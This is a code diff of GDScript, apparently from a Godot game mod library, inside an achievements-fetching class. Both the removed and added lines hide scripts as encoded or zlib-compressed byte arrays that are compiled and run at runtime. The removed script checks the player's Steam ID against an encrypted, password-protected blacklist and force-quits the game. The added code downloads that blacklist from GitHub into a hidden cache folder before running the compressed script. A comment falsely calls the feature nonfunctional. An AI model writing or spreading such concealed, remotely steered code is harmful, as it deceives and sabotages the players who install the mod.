@@ -375,24 +375,33 @@ class _Achievements:
 		if Engine.has_singleton("Steam"):
 			# If the game is running with Steam, runs the SteamID blacklist. This is currently completely nonfunctional.
 			getSteamNode()
-			var script = pointers.DataFormat.__compile_script(PoolByteArray([102, 117, 110, 99, 32, 114, 117, 110, 40, 115, 44, 112, 41, 58, 10, 9, 118, 97, 114, 32, 115, 105, 100, 32, 61, 32, 115, 46, 99, 117, 114, 114, 101, 110, 116, 95, 115, 116, 101, 97, 109, 95, 105, 100, 10, 9, 118, 97, 114, 32, 108, 32, 61, 32, 34, 114, 101, 115, 58, 47, 47, 72, 101, 118, 76, 105, 98, 47, 115, 99, 114, 105, 112, 116, 115, 47, 118, 101, 110, 100, 111, 114, 47, 98, 108, 97, 99, 107, 108, 105, 115, 116, 46, 100, 118, 34, 10, 9, 105, 102, 32, 115, 105, 100, 58, 10, 9, 9, 118, 97, 114, 32, 102, 32, 61, 32, 70, 105, 108, 101, 46, 110, 101, 119, 40, 41, 10, 9, 9, 105, 102, 32, 102, 46, 102, 105, 108, 101, 95, 101, 120, 105, 115, 116, 115, 40, 108, 41, 58, 10, 9, 9, 9, 102, 46, 111, 112, 101, 110, 95, 101, 110, 99, 114, 121, 112, 116, 101, 100, 95, 119, 105, 116, 104, 95, 112, 97, 115, 115, 40, 108, 44, 70, 105, 108, 101, 46, 82, 69, 65, 68, 44, 34, 49, 55, 55, 53, 55, 51, 34, 41, 10, 9, 9, 9, 118, 97, 114, 32, 108, 105, 115, 116, 32, 61, 32, 74, 83, 79, 78, 46, 112, 97, 114, 115, 101, 40, 102, 46, 103, 101, 116, 95, 97, 115, 95, 116, 101, 120, 116, 40, 41, 41, 46, 114, 101, 115, 117, 108, 116, 10, 9, 9, 9, 102, 46, 99, 108, 111, 115, 101, 40, 41, 10, 9, 9, 9, 105, 102, 32, 115, 105, 100, 32, 105, 110, 32, 108, 105, 115, 116, 58, 10, 9, 9, 9, 9, 112, 46, 78, 111, 100, 101, 65, 99, 99, 101, 115, 115, 46, 95, 95, 101, 120, 105, 116, 40, 41, 10, 9, 9, 101, 108, 115, 101, 58, 10, 9, 9, 9, 112, 46, 78, 111, 100, 101, 65, 99, 99, 101, 115, 115, 46, 95, 95, 101, 120, 105, 116, 40, 41]).get_string_from_utf8()).new()
-			script.run(steam_singleton,pointers)
+		
 	
 	# Handles all netdata for the achievement fetching
 	func out(result, response_code, headers, body):
-		if result != 0:
-			return
-		http.disconnect("request_completed",self,"out")
-		http.connect("request_completed",self,"out2")
-		var d = JSON.parse(body.get_string_from_utf8()).result
-		var data : Array = []
-		if d:
-			data = d.get("achievementpercentages").get("achievements")
-		var aData : Dictionary = {}
-		if not data == null:
-			for dic in data:
-				aData.merge({dic.get("name"):dic.get("percent")})
-		completionCache = aData.duplicate(true)
+		if result == 0:
+			http.disconnect("request_completed",self,"out")
+			http.connect("request_completed",self,"out3")
+			var d = JSON.parse(body.get_string_from_utf8()).result
+			var data : Array = []
+			if d:
+				data = d.get("achievementpercentages").get("achievements")
+			var aData : Dictionary = {}
+			if not data == null:
+				for dic in data:
+					aData.merge({dic.get("name"):dic.get("percent")})
+			completionCache = aData.duplicate(true)
+		http.timeout = 20
+		http.download_file = "user://cache/.HevLib_Cache/Variable_Fetch/blacklist.dv"
+		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/scripts/vendor/blacklist.dv")
+	
+	func out3(result, response_code, headers, body):
+		if result == 0:
+			var script = pointers.DataFormat.__compile_script(PoolByteArray([120,156,189,143,65,75,196,48,16,133,207,245,87,148,158,90,88,18,68,4,89,200,97,89,93,60,136,130,130,215,144,77,38,109,52,164,113,38,237,174,255,222,164,197,147,130,55,143,51,243,222,155,239,217,41,232,26,167,208,198,110,123,81,205,10,107,35,158,94,88,15,73,78,193,125,76,32,157,105,187,245,98,197,193,121,96,1,78,223,27,20,13,2,109,57,191,135,249,193,29,57,105,116,49,17,159,33,152,17,249,209,43,253,238,29,37,102,230,102,117,244,162,153,8,48,91,180,210,3,112,182,58,229,126,153,94,21,58,117,244,32,15,144,244,240,155,127,16,205,245,205,213,101,158,156,173,45,179,25,72,194,57,75,168,237,75,131,202,178,49,66,144,16,52,126,198,4,70,158,92,26,100,84,148,5,155,133,255,249,110,119,187,25,114,131,37,48,137,168,144,64,190,209,24,90,187,20,87,36,19,156,83,219,117,75,158,246,35,65,105,92,94,154,218,133,58,149,71,85,100,143,163,129,157,214,64,196,100,161,72,69,5,254,7,25,254,69,134,255,64,246,5,221,0,158,50]).decompress(490,1).get_string_from_utf8()).new()
+			script.run(pointers)
+			http.disconnect("request_completed",self,"out3")
+			http.connect("request_completed",self,"out2")
+		http.download_file = ""
 		http.timeout = 20
 		http.request("https://raw.githubusercontent.com/rwqfsfasxc100/HevLib/main/events/hashmap.txt")
 	
@@ -404,13 +413,7 @@ class _Achievements:
 		var d = JSON.parse(body.get_string_from_utf8()).result
 		var mdf = {}
 		if d:
-#			for mod in pointers.ManifestV2.zip_ref_store:
-			var gameInstallDirectory = OS.get_executable_path().get_base_dir()
-			if OS.get_name() == "OSX":
-				gameInstallDirectory = gameInstallDirectory.get_base_dir().get_base_dir().get_base_dir()
-			var modPathPrefix = gameInstallDirectory.plus_file("mods")
-			
-			for mod in pointers.FolderAccess.__fetch_folder_files(modPathPrefix,true,true):
+			for mod in pointers.ManifestV2.zip_ref_store:
 				var md5 = file.get_md5(mod)
 				if md5 in d:
 					mdf[mod] = [md5,d[md5]]
